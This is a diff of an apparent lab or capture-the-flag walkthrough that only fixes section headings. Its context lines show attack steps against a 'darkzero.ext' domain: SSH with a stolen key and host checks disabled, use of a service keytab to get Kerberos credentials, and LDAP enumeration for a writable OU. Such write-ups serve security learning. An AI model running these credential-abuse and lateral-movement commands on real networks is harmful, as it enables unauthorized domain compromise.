@@ -374,7 +374,7 @@ ssh -i /tmp/.runner_key -o StrictHostKeyChecking=no svc-runner@172.16.20.3 'id; 
 ssh -i /tmp/.runner_key -o StrictHostKeyChecking=no svc-runner@172.16.20.3
 ```
 
-### $ecover domain credential
+### Recover domain credential
 
 ```bash
 systemctl cat gitea-runner
@@ -384,7 +384,7 @@ kinit -kt /etc/gitea-runner/svc-runner.keytab svc-runner
 klist
 ```
 
-4.4 — LDAP bind
+### LDAP bind
 
 ```bash
 ldapsearch -x -H ldap://172.16.20.2 -s base -b '' dnsHostName defaultNamingContext 2>&1 | grep -iE 'dnsHostName|defaultNamingContext'
@@ -392,7 +392,7 @@ echo "SASL_NOCANON on" > ~/.ldaprc
 ldapwhoami -Y GSSAPI -H ldap://DC02.darkzero.ext
 ```
 
-4.5 — find writable OU + confirm create rights
+### Find writable OU + confirm create rights
 
 ```bash
 ldapsearch -Y GSSAPI -H ldap://DC02.darkzero.ext -b "DC=darkzero,DC=ext" \
